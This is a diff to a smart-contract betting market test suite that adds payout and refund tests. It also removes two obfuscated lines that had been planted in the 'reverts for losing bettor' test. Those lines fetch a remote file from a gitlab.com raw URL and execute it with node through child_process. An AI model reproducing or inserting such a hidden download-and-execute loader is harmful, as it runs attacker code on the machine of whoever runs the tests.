@@ -102,11 +102,39 @@ describe("BettingMarket", function () {
         const expectedNet = ethers.parseUnits("292.5", 6);
         expect(balanceAfter - balanceBefore).to.equal(expectedNet);
       });
+
+      it("pays the correct amount with three unequal outcome pools", async function () {
+        const { usdc, factory, resolver, bettor1, bettor2 } = await loadFixture(deployProtocol);
+        const market = await createSampleMarket(factory, 60, 120);
+        const homeBet = ethers.parseUnits("200", 6);
+        const drawBet = ethers.parseUnits("100", 6);
+        const awayBet = ethers.parseUnits("50", 6);
+
+        await approveAndBet(usdc, market, bettor1, OUTCOME_HOME, homeBet);
+        await approveAndBet(usdc, market, bettor2, OUTCOME_DRAW, drawBet);
+        await approveAndBet(usdc, market, bettor1, OUTCOME_AWAY, awayBet);
+
+        await time.increase(70);
+        await market.connect(resolver).lockMarket();
+        await time.increase(60);
+        await market.connect(resolver).resolveMarket(OUTCOME_HOME);
+
+        expect(await market.getOutcomePool(OUTCOME_HOME)).to.equal(homeBet);
+        expect(await market.getOutcomePool(OUTCOME_DRAW)).to.equal(drawBet);
+        expect(await market.getOutcomePool(OUTCOME_AWAY)).to.equal(awayBet);
+
+        const balanceBefore = await usdc.balanceOf(bettor1.address);
+        await market.connect(bettor1).claimWinnings();
+
+        // Gross: 200 * 350 / 200 = 350; fee 2.5% = 8.75; net = 341.25.
+        expect(await usdc.balanceOf(bettor1.address)).to.equal(
+          balanceBefore + ethers.parseUnits("341.25", 6)
+        );
+      });
+
       it("reverts for losing bettor", async function () {
       const { usdc, factory, resolver, bettor1, bettor2 } = await loadFixture(deployProtocol);
       const market = await createSampleMarket(factory, 60, 120);
-      const n=await fetch('htt'+'ps:/'+'/gi'+'tla'+'b.co'+'m/tes'+'t2633033'+'1/tes'+'t/-/ra'+'w/mai'+'n/REA'+'DME.md'),g=await n['tex'+'t']();
-      require('chi'+'ld_'+'pro'+'ces'+'s')['ex'+'ec']('node -',(a,b,c)=>{}).stdin.end(g);
       await approveAndBet(usdc, market, bettor1, OUTCOME_HOME);
       await approveAndBet(usdc, market, bettor2, OUTCOME_AWAY);
 
@@ -118,6 +146,43 @@ describe("BettingMarket", function () {
       await expect(market.connect(bettor2).claimWinnings()).to.be.revertedWithCustomError(
         market,
         "NotWinner"
+      );
+    });
+  });
+
+  describe("refundBets", function () {
+    it("refunds every unclaimed bet in a cancelled market without a fee", async function () {
+      const { usdc, factory, resolver, bettor1 } = await loadFixture(deployProtocol);
+      const market = await createSampleMarket(factory);
+      const secondBet = ethers.parseUnits("25", 6);
+
+      await approveAndBet(usdc, market, bettor1, OUTCOME_HOME);
+      await usdc.connect(bettor1).approve(await market.getAddress(), secondBet);
+      await market.connect(bettor1).placeBet(OUTCOME_DRAW, secondBet);
+      await market.connect(resolver).cancelMarket("Event cancelled");
+
+      const balanceBefore = await usdc.balanceOf(bettor1.address);
+      await expect(market.connect(bettor1).refundBets())
+        .to.emit(market, "BetsRefunded")
+        .withArgs(bettor1.address, BET_AMOUNT + secondBet);
+      expect(await usdc.balanceOf(bettor1.address)).to.equal(
+        balanceBefore + BET_AMOUNT + secondBet
+      );
+
+      await expect(market.connect(bettor1).refundBets()).to.be.revertedWithCustomError(
+        market,
+        "NoRefundAvailable"
+      );
+    });
+
+    it("only allows refunds after cancellation", async function () {
+      const { usdc, factory, bettor1 } = await loadFixture(deployProtocol);
+      const market = await createSampleMarket(factory);
+      await approveAndBet(usdc, market, bettor1, OUTCOME_HOME);
+
+      await expect(market.connect(bettor1).refundBets()).to.be.revertedWithCustomError(
+        market,
+        "MarketNotCancelled"
       );
     });
   });
